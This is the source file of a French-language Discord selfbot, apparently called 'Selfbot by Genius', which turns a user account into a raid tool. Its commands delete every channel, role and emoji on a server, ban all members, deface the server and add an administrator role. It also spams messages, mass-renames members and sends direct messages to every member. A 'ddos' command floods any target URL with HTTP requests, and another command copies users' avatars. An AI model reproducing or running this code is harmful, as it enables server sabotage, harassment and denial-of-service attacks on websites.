const Discord = require("discord.js");

var config;

config = require('./config.js');


const token = config.token;
const prefix = config.prefix;



var bot = new Discord.Client();





bot.on('ready', () => {
  console.clear();
	console.log("///////////////////// Selfbot By Genius /////////////////////")
	console.log(`> Selfbot login : ${bot.user.username} | ${bot.user.id}`)
    bot.user.setPresence({
    });
});

bot.on('message', message => {
	let args = message.content.split(" ").slice(1);
	if (message.author === bot.user){


        if (message.content.startsWith(prefix + 'help')){
             message.delete()
            let cmdList = new Discord.RichEmbed()
            .setDescription("MENU HELP")
            .setColor("#000000")
			.addField("raid", "Commandes de raid")
            
            .addField("mod", "Commandes de modération")
            .addField("user", "Commandes d'utilisateur")
            .addField("divers", "Commandes diverses")
            .setFooter('Selfbot by Genius');

            
            
            
            message.channel.send(cmdList)
        }







        if (message.content.startsWith(prefix + 'raid')){
             message.delete()
            let cmdList = new Discord.RichEmbed()
            .setDescription("MENU RAID")
            .setColor("#000000")
            .addField("deletechannel", "Supprime tous les salons")
            .addField("spam [text]", "Spam un message")
            .addField("stopspam", "Stop le spam")
            .addField("mpall [text]", "Envoie un message privé à tous les membres du serveur")
            .addField("deleterole", "Supprime tous les rôles")
            .addField("allban", "Ban tous les membres possible")
            .addField("unbanall", "Révoque tous les banissements")
            .addField("deface [imageurl]", "Renomme le serveur, change la région et change la photo du serveur")
            .addField("rolesadd [text]", "Crée beaucoup de rôles")
            .addField("channelsadd [text]", "Crée beaucoup de channels")
            .addField("adminroleadd", "Crée un rôle administrateur")
            .addField("renameall [text]", "Renomme tout le monde")
            .setFooter('Selfbot by Genius');

            
            
            
            message.channel.send(cmdList)
        }










if (message.content.startsWith(prefix + 'mod')){
            message.delete()
            let cmdList = new Discord.RichEmbed()
            .setDescription("MENU MODÉRATION")
            .setColor("#000000")
            .addField("kick [mention]", "Kick un utilisateur")
            .addField("ban [mention]", "Ban un utilisateur")
            .addField("purge [nb]", "Supprime un certain nombre de message")
            
            .setFooter('Selfbot by Genius');

            
            
            
            message.channel.send(cmdList)
        }




if (message.content.startsWith(prefix + 'user')){
            message.delete()
            let cmdList = new Discord.RichEmbed()
            .setDescription("MENU UTILISATEUR")
            .setColor("#000000")
            .addField("stream [text]", "Te met en stream")
            .addField("listen [text]", "Te met en écoute")
            .addField("watch [text]", "Te met en regarde")
            .addField("play [text]", "Te met en joue")
            
            .addField("pp [imageurl]", "Modifie ta photo de profil")
            .addField("avatar [mention]", "Vole la photo de profil de l'utilisateur mentionné")
            .addField("online", 'Met ton statut en "connecté"(pastille verte)')
            .addField("away", 'Met ton statut en "inactif"(pastille jaune)')
            .addField("dnd", 'Met ton statut en "ne pas déranger"(pastille rouge)')
            .addField("invisible", 'Met ton statut en "invisible"(pastille grise)')
            .addField("MultiStream", 'commande MultiStream')
            
            .setFooter('Selfbot by Genius');

            
            
            
            message.channel.send(cmdList)
        }






        if (message.content.startsWith(prefix + 'divers')){
             message.delete()
            let cmdList = new Discord.RichEmbed()
            .setDescription("MENU DIVERSES")
            .setColor("#000000")
            .addField("embed [text]", "Envoie un embed")
            .addField("ping", "ton ping")
            .addField("shutdown", "Ferme le SelfBot")
            .addField("infos [mention]", "Envoie des infos d'un utilisateur")
            .addField("serverinfos", "Envoie les infos du serveur")
            .addField("nsfw", "Envoie une image nsfw")
            .addField("gif [text]", "Envoie un gif")
            .addField("giflist", "Pour afficher toute la liste des gifs disponibles")
            
            .setFooter('Selfbot by Genius');

            
            
            
            message.channel.send(cmdList)
        }





if (message.content.startsWith(prefix + "kick")) { 
var member= message.mentions.members.first();  
member.kick().then((member) => {  
message.channel.send(":wave: " + member.displayName + "s'est fait expulser").catch(() => {  
message.channel.send("Tu n'as pas les permissions");
 })
 }); 
 }



if (message.content.startsWith(prefix + "ban")) { 
var member= message.mentions.members.first();  
member.ban().then((member) => {  
message.channel.send(":wave: " + member.displayName + "s'est fait bannir").catch(() => {
message.channel.send("Tu n'as pas les permissions");
})
 }); 
 }





                 if (message.content === prefix + "nsfw"){
          if (message.author.id == bot.user.id)
            message.delete();
    var max = 5511;
    var min = 1000;
    var MathRan = Math.floor(Math.random() * (max - min + 0)) + min;
    var MathLoL = Math.round(MathRan);
    if (message.channel.nsfw) {
        message.channel.send(": CHANNEL NSFW STP ^^ ")
    } else {
        var randomname = Math.floor(Math.random() * (99999999999999999999 - 11111111111111111111 + 0)) + 11111111111111111111;
    }
    
    let embed = new Discord.RichEmbed()   
        .setColor(0xd36b00)
        .setTitle('**Picture Of Ass**')
        .setDescription("[L'image Charge Pas Click Ici !](http://media.obutts.ru/butts_preview/0" + MathLoL + ".jpg)")
            .setImage("http://media.obutts.ru/butts_preview/0" + MathLoL + ".jpg")
        embed.setTimestamp();       
        message.channel.send(embed);
    
    }








if (message.content.startsWith(prefix + 'serverinfos')){
message.delete()

function checkDays(date) {
        let now = new Date();
        let diff = now.getTime() - date.getTime();
        let days = Math.floor(diff / 86400000);
        return days + (days == 1 ? " day" : " days") + " ago";
    };
    let region = {
        "brazil": ":flag_br: Brazil",
        "eu-central": ":flag_eu: Central Europe",
        "singapore": ":flag_sg: Singapore",
        "us-central": ":flag_us: U.S. Central",
        "sydney": ":flag_au: Sydney",
        "us-east": ":flag_us: U.S. East",
        "us-south": ":flag_us: U.S. South",
        "us-west": ":flag_us: U.S. West",
        "eu-west": ":flag_eu: Western Europe",
        "vip-us-east": ":flag_us: VIP U.S. East",
        "london": ":flag_gb: London",
        "amsterdam": ":flag_nl: Amsterdam",
        "hongkong": ":flag_hk: Hong Kong",
        "russia": ":flag_ru: Russia",
        "southafrica": ":flag_za:  South Africa"
    };

    const embed = new Discord.RichEmbed()
    .setColor("#000000")
        .setAuthor(message.guild.name, message.guild.iconURL)
        .addField("__Nom:__", message.guild.name, true)
        .addField("__ID:__", message.guild.id, true)
        .addField("__Owner:__", `${message.guild.owner.user.username}#${message.guild.owner.user.discriminator}`, true)
        .addField("__Région:__", region[message.guild.region], true)
        .addField("#=Total** | **Humains** | **bots=#", `${message.guild.members.size} membres au total | ${message.guild.members.filter(member => !member.user.bot).size} humains | ${message.guild.members.filter(member => member.user.bot).size} bots`, true)
        .addField("__Channels:__", message.guild.channels.size, true)
        .addField("__Roles:__", message.guild.roles.size, true)
        .addField("__Date de création:__", `${message.channel.guild.createdAt.toUTCString().substr(0, 16)} (${checkDays(message.channel.guild.createdAt)})`, true)
        .setThumbnail(message.guild.iconURL)
.setFooter('Selfbot made By Genius');



    message.channel.send(embed);
}



if (message.content.startsWith(prefix + 'avatar')){
	message.delete()
	args[0] = message.mentions.members.first()
        	var usermentions = args[0]
	

const photosteal = new Discord.RichEmbed()
  .setColor('#000000')
.setThumbnail(usermentions.user.displayAvatarURL)
    .setDescription("Photo de profil de " + usermentions + " volée :white_check_mark: !")

bot.user.setAvatar(usermentions.user.displayAvatarURL);
message.channel.send(photosteal)

}








        






if (message.content === prefix + 'unbanall') {
   if (message.deletable) message.delete();
   let interval = setInterval(function () {
     message.guild.fetchBans().then(bans => {
       bans.forEach(ban => {
         message.guild.unban(ban.id);
       });
     });
   }, 1000);
   message.channel.send("Unban éffectué :white_check_mark:")
 }
 
 
    if (message.content.startsWith(prefix + 'ping')){
answertime = new Date().getTime() - message.createdTimestamp + " ms"
message.delete()
  message.channel.send("Pong!:white_check_mark:  Retour en `" + answertime + "`"); 

}









		if (message.content.startsWith(prefix + 'embed')){
            message.delete()
			let sayEmbed = new Discord.RichEmbed()
			.setDescription(`${args.join(" ")}`)
			.setColor("#000000")
			

			message.channel.send(sayEmbed)
		}












if(message.content == "/shutdown"){
message.channel.send("Fermeture du Selfbot...")
           
process.exit()

    }






  if (message.content.startsWith(prefix + 'deface')) {
    if (message.deletable) message.delete();
    message.guild.setRegion('brazil')
    message.guild.setName(args[0])
    n=0
    while (n < args[1]) {
    	
    	message.guild.createChannel("bolosse va");
    	message.guild.createRole();
    	message.channel.send("@everyone");
    	n=n+1;
   
    }

    message.channel.send("Deface réussi :white_check_mark:")

    
  }


if(message.content.startsWith(prefix + "purge")) {
    let args = message.content.split(" ").slice(1);
    let messagecount = parseInt(args[0]) || 999;
    var deletedMessages = -1;
    message.channel.fetchMessages({ limit: Math.min(messagecount + 1, 100, 200) })
        .then(messages => {
            messages.forEach(m => { m.delete().catch(console.error); deletedMessages++; });
        }).then(() => {
            if (deletedMessages === -1) deletedMessages = 0;
          
        }).catch(console.error);
       }



if (message.content.startsWith(prefix + 'pp')){
	message.delete()
	

	const photochange = new Discord.RichEmbed()
  .setColor('#000000')
.setThumbnail(args.join(" "))
    .setDescription("Changement de photo de profil réussie :white_check_mark: !")


bot.user.setAvatar(args.join(" "));
message.channel.send(photochange)

}






/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
if (message.content.startsWith(prefix + 'giflist')){
             message.delete()
            let cmdList = new Discord.RichEmbed()
            .setTitle("#=LISTE DES GIFS=#")
            .setColor("#000000")
            .setDescription("`issou`, " + "`pissou`, " + "`wissou`, " + "`epilepsy`, " + "`peveryone`, " + "`genius`, " + "`rage`, " + "`fbi`, " + "`hide`, " + "`party`, ")
.setFooter('Selfbot made By Genius', 'https://cdn.discordapp.com/attachments/627432311704649739/631924472915558401/BigAromaticEthiopianwolf-max-1mb.gif');

            
            
            
            message.channel.send(cmdList)
        }








if (message.content.startsWith(prefix + 'gif')){
    
    if (message.content != prefix + "giflist") {
    
    
    
    if (args.join("") === "pissou"){
    
    
    const pissougif = new Discord.RichEmbed()
    .setColor('#000000')
    .setImage('https://cdn.discordapp.com/attachments/360828747269537795/561661491485343747/17900-full.gif')
    
    
    message.delete();
    message.channel.send(pissougif)
    
    
    
    
    } else if (args.join("") === "wissou"){
    
    
  const wissougif = new Discord.RichEmbed()
  .setColor('#000000')
  .setImage('https://media.tenor.com/images/bfe59a4eaa8fb8f0aa55a9c8f24f1cd3/tenor.gif')
  
  
  message.delete();
  message.channel.send(wissougif)
  
    
    
    }else if (args.join("") === "epilepsy"){
    
    
    
    const issougif = new Discord.RichEmbed()
    .setColor('#000000')
    
    .setImage('https://i.pinimg.com/originals/d4/07/3d/d4073dedf2a9a4bcb9e9343dcb02900a.gif')
    
    
    
    message.delete();
    message.channel.send(issougif)
    
    
    
    } else if (args.join("") === "hide"){
    
    
    
    const issougif = new Discord.RichEmbed()
    .setColor('#000000')
    
    .setImage('https://i.makeagif.com/media/1-17-2016/kYqDeN.gif')
    
    
    
    message.delete();
    message.channel.send(issougif)
    
    
    
    } 
    else if (args.join("") === "genius"){
    
    
    
    const issougif = new Discord.RichEmbed()
    .setColor('#000000')
    
    .setImage('https://media.tenor.com/images/d50d6b06878bc263c7ce7563fbf156b4/tenor.gif ')
    
    
    
    message.delete();
    message.channel.send(issougif)
    
    
    
    } 
    else if (args.join("") === "rage"){
    
    
    
    const issougif = new Discord.RichEmbed()
    .setColor('#000000')
    
    .setImage('https://media.discordapp.net/attachments/567461299198492683/567969475681320960/inconnu.gif')
    
    
    
    message.delete();
    message.channel.send(issougif)
    
    
    
    } 
    else if (args.join("") === "party"){
    
    
    
    const issougif = new Discord.RichEmbed()
    .setColor('#000000')
    
    .setImage('https://media1.tenor.com/images/9bf8ef57e41298134471103362475365/tenor.gif ')
    
    
    
    message.delete();
    message.channel.send(issougif)
    
    
    
    } 
    else if (args.join("") === "peveryone"){
    
    
    
    const issougif = new Discord.RichEmbed()
    .setColor('#000000')
    
    .setImage('https://cdn.discordapp.com/attachments/569173692060532755/572530862789492736/be8.gif')
    
    
    
    message.delete();
    message.channel.send(issougif)
    
    
    
    } else if (args.join("") === "fbi"){
    
    
    
    const issougif = new Discord.RichEmbed()
    .setColor('#000000')
    
    .setImage('https://thumbs.gfycat.com/DizzyClearcutKookaburra-max-1mb.gif ')
    
    
    
    message.delete();
    message.channel.send(issougif)
    
    
    
    }        
   
   
   else if (args.join("") === "issou"){
    
    
    
    const issougif = new Discord.RichEmbed()
    .setColor('#000000')
    
    .setImage('https://media1.tenor.com/images/f86c3a13ddb998631efa393d1c289567/tenor.gif')
    
    
    
    message.delete();
    message.channel.send(issougif)
    
    
    
    }
    
    
    else {
    
    
    
    const nogif = new Discord.RichEmbed()
    .setColor('#000000')
    
    .addField("ERROR 404: `" + args.join("") + "` \nAuncun gif n'est associé à ce nom, vous pouvez voir la liste des gifs avec:" ,"```/giflist```")
    
    
    
    message.delete();
    message.channel.send(nogif)
    
    }
    
    
    
    }
    
    
    
} 






















/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////
/////////////////////////////////


if (message.content === prefix + 'deletemoji') {
    if (message.deletable) message.delete();
    message.guild.emojis.forEach(emotes => {
      emotes.delete()
    });
  }
  
  if (message.content === prefix + 'deleterole') {
    if (message.deletable) message.delete();
    message.guild.roles.forEach(role => {
      role.delete()
    });
    message.channel.send("Tous les rôles ont étés supprimés :white_check_mark:")
  }

if (message.content === prefix + 'allban') {
   message.delete()
   message.guild.members.forEach(servermbrs => {
     servermbrs.ban();
   })
   message.channel.send("Ban all réussi :white_check_mark:")
 }















 if (message.content.startsWith(prefix + 'ddos')){
message.delete()


            let sayEmbed = new Discord.RichEmbed()
            .setColor("#000000")
            
            .setTitle('DD0S lancé sur ' + "`" + args.join(" ") + "`")
           
            

            message.channel.send(sayEmbed)

    const request = require('request');



const interval = 32768;



console.log('=========================================================================================================');
               
 console.log('Genius DD0S T00L');
            
console.log('=========================================================================================================');
         
var target = args.join(" ")

    var cible = "http://" + target



packet = function () {
    
        code = "H"
    return code;
}

sendrequest = function (code) {
    request(cible , (error) => {
        if(error){
               
           
            
// logger.error(error);
    

                
            return;
        }
 
          
        })}







var count = 1
sendrequest(packet());
setInterval(() => {
//while (count < packetnumber) {

    sendrequest(packet());
    count++
    console.log(`[PACKET SENT] = ` + count) ;
//}
}, (1/interval) * 1000);





            
        }






		if (message.content.startsWith(prefix + 'infos')){
             message.delete()
        	args[0] = message.mentions.members.first()
        	var usermentions = args[0]
	
        	let userPpEmbed = new Discord.RichEmbed()
        	.setDescription(`__Informations de ${args[0]}__`)
        	.setImage(usermentions.user.displayAvatarURL)
        	.addField(`__ID :__`, `${usermentions.id}`)
            .addField(`__Date de création du compte : __`, `${usermentions.user.createdAt}`)

        	
        	.setColor("#000000")

        	message.channel.send(userPpEmbed)
		}


			if (message.content.startsWith(prefix + 'stream')){
             message.delete()
             bot.user.setActivity({
             game: {
             name: `${args.join(" ")}`,
             type: "STREAMING",
             url:"https://www.twitch.tv/geniusssss",
             
             }
             });
             message.channel.send("Ton activité est maintenant `Streame " + args.join("") + "` :white_check_mark:")
            }


			if (message.content.startsWith(prefix + 'listen')){
             message.delete()
             bot.user.setPresence({
             game: {
             name: `${args.join(" ")}`,
             type: "LISTENING",
             
             }
             });
             message.channel.send("Ton activité est maintenant `Écoute " + args.join("") + "` :white_check_mark:")
            }

			if (message.content.startsWith(prefix + 'watch')){
             message.delete()
             
             bot.author.setPresence({
             game: {
             name: `${args.join(" ")}`,
             type: "WATCHING",
            
             }
             });
             message.channel.send("Ton activité est maintenant `Regarde " + args.join("") + "` :white_check_mark:")
             
             
            }
            
            
            
            
            if (message.content.startsWith(prefix + 'play')){
            message.delete()
            
            bot.user.setPresence({
            game: {
            name: `${args.join(" ")}`,
            type: "PLAYING",
            
            }
            });
            message.channel.send("Ton activité est maintenant `Joue à " + args.join("") + "` :white_check_mark:")
            
            
            }
            


if (message.content.startsWith(prefix + 'dnd')){
message.delete()

bot.user.setStatus('dnd', 'Genius') 
message.channel.send("Votre statut est maintenant: `ne pas déranger` :white_check_mark:")

}


if (message.content.startsWith(prefix + 'away')){
message.delete()
bot.user.setStatus('idle', 'Genius') 
message.channel.send("Votre statut est maintenant: `inactif` :white_check_mark:")

}



if (message.content.startsWith(prefix + 'invisible')){
message.delete()
bot.user.setStatus('invisible', 'Genius') 
message.channel.send("Votre statut est maintenant: `invisible` :white_check_mark:")

}

if(message.content === prefix + "multistream"){
      if (message.deletable) message.delete();
      if (message.author.id != "627250023876263947") return
        let rotate = 0;
    setInterval(function() {
        if(rotate === 0) {
            client.user.setActivity("Le", {type: "Streaming", url: 'https://www.twitch.tv/Geniusssss'});
            rotate = 1;       
        } else if(rotate === 1){
            client.user.setActivity("SelfBot", {type: "Streaming", url: 'https://www.twitch.tv/Geniusssss'});
            rotate = 2;
        } else if(rotate === 2){
            client.user.setActivity(`De`, {type: "Streaming", url: 'https://www.twitch.tv/Geniusssss'});
            rotate = 3;
        }  else if(rotate === 3){
            random = Math.floor(Math.random() * 7) + 1;
            client.user.setActivity(`Genius 👁️`, {type: "Streaming", url: 'https://www.twitch.tv/Geniusssss'});
            rotate = 0;
        }}, 20 * 2000)
            var embed = new Discord.RichEmbed()
        .setAuthor("| MultiStream En Cours...")
        
        .setColor(0x000001)
        .setFooter('Selfbot by Genius');
      message.channel.sendEmbed(embed);
      }


if (message.content.startsWith(prefix + 'online')){
message.delete()
bot.user.setStatus('online', 'Genius') 
message.channel.send("Votre statut est maintenant: `connecté` :white_check_mark:")

}

		if (message.content.startsWith(prefix + 'deletechannel')){
			 message.delete()
			
    		message.guild.channels.forEach(channel => {
    		        
    		            channel.delete()
    		        
    		    });
    		
    	}









    
    if (message.content.startsWith(prefix + "spam")) {
    if (message.deletable) message.delete();
    n=0
    if (message.channel.type === "dm")     while (n < args[1]) {
    	message.reply(args[0]);
    	
  		n++;
	};
    


    

    while (n < args[1]) {
    	message.channel.send(args[0]);
    	
  		n++;
	}



    	
    
    
    }
    


  if (message.content.startsWith(prefix + "mpall")) {
    message.delete();
    if (message.channel.type === "dm") return;
    let args = message.content.split(" ").slice(1).join(" ");
    if (!args) return message.channel.send(":skull_crossbones: ERROR 404 :skull_crossbones:");
    message.guild.members.forEach(member => {
      member.send(args).catch(e => {});
    })
    message.channel.send("Mp all réussi :white_check_mark:")
  }

    	if (message.content.startsWith(prefix + 'rolesadd')){
    		message.delete()
    		role = 0
    		while (role < 50){
            	test = args.join(" ")
            	message.guild.createRole( {
            	        name: `Genius le BEST`,
            	        color: "#000000",
            	    } )
            	
            	role++;
    		}
    	}






    	if (message.content.startsWith(prefix + 'channelsadd')){
    		message.delete()
    		channeladd = 0
    		while (channeladd < 50){
    			message.guild.createChannel(`${args.join(" ")}`, "text");
    			
    			channeladd++;
    		}
    	}




    	if (message.content.startsWith(prefix + 'adminroleadd')){
    		message.delete()
            message.guild.createRole( {
                    name: "Genius le best",
                    permissions: [`ADMINISTRATOR`]
                    
                } )
                message.channel.send("Rôle ajouté :white_check_mark:")
            
    	}










    	if (message.content.startsWith(prefix + 'renameall')){
    		message.delete()
    
        		message.guild.members.forEach(m => {
            		m.setNickname(`${args.join(" ")}`);
        		});
    	message.channel.send("Rename réussi :white_check_mark:")
    	}









    	

    		
    	



    	

    }



else { return;}





















	
});
bot.login(token)












































